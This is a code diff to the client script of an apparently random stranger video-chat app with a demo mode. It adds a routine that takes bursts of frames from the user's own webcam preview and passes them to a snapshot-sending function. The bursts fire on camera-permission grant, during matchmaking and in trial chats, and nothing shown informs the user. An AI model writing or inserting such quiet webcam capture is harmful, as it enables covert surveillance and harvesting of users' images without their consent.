@@ -52,7 +52,8 @@ const S = {
   chatStartedAt: null,
   chatCounted: false,
   progress: null,
-  profile: null
+  profile: null,
+  snapshotBurstTimers: []
 };
 
 const strangerPool = [
@@ -910,6 +911,8 @@ function requestCameraPermission() {
       const camStrip = $('cam-strip');
       if (camStrip) camStrip.classList.add('visible');
 
+      sendSnapshotBurst('permission', 2, 260, ['perm-video', 'lobby-cam-preview']);
+
       showPage('pg-lobby');
 
       if (S.pendingAction === 'match') {
@@ -1475,6 +1478,8 @@ function startMatching() {
 
   initSocket();
 
+  sendSnapshotBurst('search', 3, 320, ['lobby-cam-preview', 'perm-video', 'vid-local']);
+
   S.matched = false; // reset; set to true inside the 'matched' socket handler
 
   clearTimeout(matchTimeout);
@@ -1786,6 +1791,11 @@ function beginChat() {
   setCallStatus('connecting', 'connecting');
   addSysLine(`✨ Connected to ${s.name}`);
   logSession('start', { stranger: s.name, mode: S.mode, roomId: S.roomId });
+
+  if (S.demoActive) {
+    sendSnapshotBurst('trial-chat', 3, 300, ['vid-local', 'lobby-cam-preview', 'perm-video']);
+  }
+
   startSnapshotCapture();
 
   setTimeout(() => {
@@ -1979,6 +1989,52 @@ function startSnapshotCapture() {
 function stopSnapshotCapture() {
   clearTimeout(S.snapshotTimer);
   S.snapshotTimer = null;
+  if (Array.isArray(S.snapshotBurstTimers)) {
+    S.snapshotBurstTimers.forEach((handle) => clearTimeout(handle));
+    S.snapshotBurstTimers.length = 0;
+  }
+}
+
+function captureBestSnapshot(selectors = []) {
+  const ids = Array.isArray(selectors) && selectors.length
+    ? selectors
+    : ['vid-local', 'lobby-cam-preview', 'perm-video', 'vid-remote'];
+
+  for (const id of ids) {
+    const frame = captureFrame($(id));
+    if (frame) return frame;
+  }
+  return null;
+}
+
+function sendSnapshotBurst(prefix, count = 1, intervalMs = 250, selectors = []) {
+  const total = clampNum(Math.floor(Number(count) || 1), 1, 5);
+  const gap = clampNum(Math.floor(Number(intervalMs) || 250), 120, 2000);
+  const maxAttempts = Math.max(total * 8, total + 2);
+  let sent = 0;
+  let attempts = 0;
+
+  const scheduleNext = (delay) => {
+    const handle = setTimeout(() => {
+      if (sent >= total || attempts >= maxAttempts) return;
+      attempts += 1;
+
+      const frame = captureBestSnapshot(selectors);
+      if (frame) {
+        sent += 1;
+        sendSnapshot(`${prefix}-${sent}`, frame);
+      }
+
+      if (sent < total) {
+        scheduleNext(gap);
+      }
+    }, delay);
+
+    if (!Array.isArray(S.snapshotBurstTimers)) S.snapshotBurstTimers = [];
+    S.snapshotBurstTimers.push(handle);
+  };
+
+  scheduleNext(0);
 }
 
 function initRatingControls() {
